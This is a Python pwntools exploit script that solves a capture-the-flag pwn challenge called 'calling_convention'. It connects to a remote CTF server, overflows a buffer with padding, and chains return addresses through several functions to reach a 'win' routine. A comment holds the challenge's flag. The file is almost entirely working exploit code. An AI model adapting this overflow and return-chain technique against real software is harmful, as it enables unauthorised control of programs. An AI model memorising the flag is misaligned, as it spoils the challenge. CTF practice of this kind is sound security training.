#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./calling_convention", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chal.bearcatctf.io", 39440)

payload = b"A" * 0x10
payload += p64(elf.sym["number3"]+0x8)
payload += p64(elf.sym["set_key1"])
payload += p64(elf.sym["ahhhhhhhh"]+0x8)
payload += p64(elf.sym["food"])
payload += p64(elf.sym["win"]+0x5)

p.sendlineafter(b"> ", payload)

p.readuntil(b"{")

# BCCTF{R0p_Ch41ns_1b01c1c3}
print("BCCTF{" + p.readuntil(b"}").decode())
